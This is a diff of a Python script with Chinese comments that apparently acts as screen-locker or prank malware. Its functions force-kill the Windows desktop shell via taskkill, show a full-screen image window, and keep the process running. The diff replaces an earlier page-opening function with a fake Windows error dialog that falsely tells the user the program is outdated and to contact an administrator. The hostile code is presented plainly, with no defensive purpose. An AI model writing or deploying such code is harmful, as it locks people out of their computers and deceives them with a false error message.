@@ -1,21 +1,22 @@
-from psutil import pid_exists as pidExists # 导入psutil模块 用于进程管理
-from webbrowser import open as webOpen # 导入webbrowser模块 用于打开网页
-from tkinter import Label, Tk # 导入tkinter模块 用于创建窗口
-from PIL import Image, ImageTk # 导入PIL模块 用于图片处理
-import sys # 导入sys模块 用于获取当前程序路径
-from os import path, system, getpid, execl  # 导入os模块 用于文件操作
+import sys # 处理路径
+from time import sleep # 延时
+from tkinter import Label, Tk # 创建窗口
+from PIL import Image, ImageTk # 图片处理
+from ctypes import windll # 调用系统API
+from psutil import pid_exists as pidExists # 进程管理
+from os import path, system, getpid, execl  # 文件操作
 
 
-# 打开网页
-def openWebPage():
-    try: webOpen("https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB") # 使用默认浏览器打开指定的网页
-    except: pass # 忽略错误
+# 打开提示窗口
+def errorWindow():
+    try: windll.user32.MessageBoxW(None, "程序版本过低，请联系管理员更新！", "错误", 0x10)
+    except: pass
 
 
 # 结束桌面程序
 def endDesktopProgram():
     try: system("taskkill /f /im explorer.exe") # 结束桌面程序
-    except: pass # 忽略错误
+    except: pass
 
 
 # 创建全屏窗口
@@ -30,12 +31,15 @@ def fullScreenWindow():
         label = Label(root, image=photo) # 创建标签
         label.pack(fill='both', expand=True) # 填充窗口
         root.mainloop() # 运行窗口 
-    except: pass # 忽略错误
+    except: pass
 
 
 # 监控进程，如果进程不存在则重启
 def monitorProcess():
-    pid = getpid()  # 获取当前进程pid
-    while True:  # 循环监控
-        if not pidExists(pid): execl(sys.executable, sys.executable, *sys.argv)  # 重启进程
+    try:
+        pid = getpid()  # 获取当前进程pid
+        while True:
+            sleep(1)  # 延时
+            if not pidExists(pid): execl(sys.executable, sys.executable, *sys.argv)  # 重启进程
+    except: pass
  
